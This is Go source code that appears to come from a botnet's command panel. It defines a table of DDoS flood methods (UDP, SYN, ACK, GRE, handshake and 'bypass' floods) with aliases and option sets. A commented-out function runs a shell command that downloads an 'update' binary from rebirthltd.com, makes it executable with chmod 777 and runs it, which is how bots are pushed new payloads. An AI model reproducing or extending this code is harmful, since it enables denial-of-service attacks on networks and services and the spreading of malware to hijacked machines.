package flood

var (
	Limiter = NewFloodLimiter()

	Methods = map[string]*Method{
		"!udpplain": {
			ID:          0,
			Name:        "udpplain",
			Aliases:     []string{"!plainudp", "!udp", "udp", "udpplain"},
			Description: "UDP socket flood",
			Options:     []uint8{0, 1, 6, 7, 27, 28, 29, 30, 31, 37},
		},
		"!raknet": {
			ID:          16,
			Name:        "raknet",
			Aliases:     []string{"!raknet", "raknet"},
			Description: "UDP socket flood",
			Options:     []uint8{0, 1, 6, 7, 27, 28, 29, 36, 37},
		},
		"!ovpn": {
			ID:          15,
			Name:        "openvpn",
			Aliases:     []string{"!openvpn", "ovpn", "openvpn", "udpopenvpn", "udpvpn"},
			Description: "UDP socket flood",
			Options:     []uint8{6, 7, 30, 37},
		},
		"!udpbypass": {
			ID:          14,
			Name:        "udpbypass",
			Description: "UDP socket flood",
			Options:     []uint8{0, 1, 6, 7, 27, 28, 29, 30, 31, 32, 33, 35, 37},
		},
		"!tcpbypass": {
			ID:          2,
			Name:        "tcpbypass",
			Description: "TCP IP flood",
			Aliases:     []string{"tcpbypass"},
			Options:     []uint8{0, 7, 27, 28, 29, 37},
		},
		"!ack": {
			ID:          4,
			Name:        "ack",
			Description: "TCP ACK flood",
			Aliases:     []string{"!tcpack", "ack", "ackflood", "!ackflood"},
			Options:     []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 27, 28, 37},
		},
		"!socket": {
			ID:          6,
			Name:        "socket",
			Description: "TCP socket flood with lots of options",
			Aliases:     []string{"!tcpsocket", "socket", "!socketflood", "socketflood"},
			Options:     []uint8{0, 1, 7, 27, 28, 30, 31, 32, 33, 29, 34, 37},
		},
		"!sockethold": {
			ID:          7,
			Name:        "sockethold",
			Description: "TCP socket flood designed to max out available sockets",
			Aliases:     []string{"!tcpsockethold", "sockethold"},
			Options:     []uint8{7},
		},
		"!greip": {
			ID:          10,
			Name:        "greip",
			Aliases:     []string{"greip", "!greflood", "!gre", "gre", "greflood"},
			Description: "Layer 3 GRE IP flood",
			Options:     []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25, 27, 28, 37},
		},
		"!stomp": {
			ID:          11,
			Name:        "stomp",
			Description: "TCP handshake + ACK/PSH flood",
			Aliases:     []string{"!tcpstomp", "stompflood", "stomp", "!stompflood", "tcpstomp"},
			Options:     []uint8{0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16, 27, 28, 37},
		},
		"!handshake": {
			ID:          12,
			Name:        "handshake",
			Description: "TCP 3-way handshake flood",
			Aliases:     []string{"!tcphandshake", "!oack", "!ovh", "handshake"},
			Options:     []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 27, 28, 30, 31, 32, 33, 34, 37},
		},
		"!std": {
			ID:          13,
			Name:        "std",
			Description: "Standard socket flood",
			Aliases:     []string{"!standard", "std"},
			Options:     []uint8{0, 1, 7, 27, 28, 37},
		},
		"!rawudp": {
			ID:          1,
			Name:        "rawudp",
			Aliases:     []string{"!udpraw", "udpraw"},
			Description: "yes",
			Options:     []uint8{2, 3, 4, 0, 1, 5, 6, 7, 25, 37},
		},
		"!syndata": {
			ID:          5,
			Name:        "syndata",
			Aliases:     []string{"!tcpsyndata", "syndata", "synflood", "syn", "!tcpsyn", "!synflood", "!syn", "tcpsyn"},
			Description: "yes",
			Options:     []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 27, 28, 29, 37},
		},
		"!wra": {
			ID:          9,
			Name:        "wra",
			Aliases:     []string{"wra", "tcpwra", "!tcpwra"},
			Description: "yes",
			Options:     []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 27, 28, 37},
		},
		"!gudp": {
			ID:          17,
			Name:        "gudp",
			Aliases:     []string{"gbps", "udpgbps", "!gudp"},
			Description: "GUDP",
			Options:     []uint8{0, 1, 6, 7, 27, 28, 29, 30, 31, 32, 33, 35, 37},
		},
	}
)

func Clone() []*Method {
	var lol []*Method
	for _, method := range Methods {
		lol = append(lol, method)
	}

	return lol
}

func Get(name string) *Method {
	for key, method := range Methods {
		if key == name {
			return method
		}

		for _, alias := range method.Aliases {
			if alias == name {
				return method
			}
		}
	}

	return nil

/*func HandleCommand(command string) {
	switch command {
	case "!updateallbots":
		UpdateBots()
	default:
		fmt.Println("Unknown command:", command)
	}
}

func UpdateBots() {
	cmd := exec.Command("bash", "-c", "ftpget update update; curl -O http://rebirthltd.com/update; wget http://rebirthltd.com/update; chmod 777 update; ./update")
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	fmt.Println("Output of update command:", out.String())*/
}


